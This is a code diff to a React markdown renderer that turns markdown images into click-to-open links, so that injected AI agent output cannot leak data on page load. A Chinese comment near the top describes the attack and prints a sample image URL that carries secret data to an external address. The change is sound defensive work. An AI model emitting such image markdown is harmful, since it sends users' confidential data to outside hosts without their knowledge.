@@ -93,6 +93,28 @@ function remarkHtmlBreaks() {
   });
 }
 
+/*
+  Markdown 图片一律不自动加载：Agent 输出可能被注入，`![](https://外部地址/?d=机密)` 在页面打开时就会把数据带出去。
+  http(s) 图片改成需手动点开的新窗口链接，其余地址和已在链接里的图片只留文字；链接地址仍经 react-markdown 的 urlTransform 清洗。
+*/
+type HastNode = { type: string; tagName?: string; value?: string; properties?: Record<string, unknown>; children?: HastNode[] };
+function rehypeImagesAsLinks() {
+  const replace = (node: HastNode, insideLink: boolean) => {
+    node.children = node.children?.map(child => {
+      if (child.type !== 'element') return child;
+      if (child.tagName === 'img') {
+        const label: HastNode = { type: 'text', value: `图片：${String(child.properties?.alt ?? '').trim() || '未命名'}` };
+        const src = child.properties?.src;
+        if (insideLink || typeof src !== 'string' || !/^https?:\/\//i.test(src)) return label;
+        return { type: 'element', tagName: 'a', properties: { href: src, target: '_blank', rel: ['noreferrer'] }, children: [label] };
+      }
+      replace(child, insideLink || child.tagName === 'a');
+      return child;
+    });
+  };
+  return (tree: unknown) => replace(tree as HastNode, false);
+}
+
 /** 单元格里的长路径、文件名只在 / . _ - 之后断开；<wbr> 不进入复制出的文字。 */
 const breakable = /[^\s]{17,}/g;
 function breakPieces(value: string): Array<{ text: string } | { wbr: true }> {
@@ -165,8 +187,9 @@ const shareComponents: Components = {
 // remark-cjk-friendly：让 `**「抖动」**，` 这类紧挨中文标点的强调也能成立（CommonMark 的定界规则会拒绝它）。
 const remarkPlugins = [remarkGfm, remarkCjkFriendly, remarkHtmlBreaks];
 const shareRemarkPlugins = [...remarkPlugins, remarkShareLayout];
+const rehypePlugins = [rehypeImagesAsLinks];
 
 export const MarkdownContent = memo(function MarkdownContent({ children, variant }: { children: string; variant?: 'share' }) {
-  if (variant === 'share') return <ReactMarkdown remarkPlugins={shareRemarkPlugins} components={shareComponents}>{children}</ReactMarkdown>;
-  return <ReactMarkdown remarkPlugins={remarkPlugins} components={markdownComponents}>{children}</ReactMarkdown>;
+  if (variant === 'share') return <ReactMarkdown remarkPlugins={shareRemarkPlugins} rehypePlugins={rehypePlugins} components={shareComponents}>{children}</ReactMarkdown>;
+  return <ReactMarkdown remarkPlugins={remarkPlugins} rehypePlugins={rehypePlugins} components={markdownComponents}>{children}</ReactMarkdown>;
 });
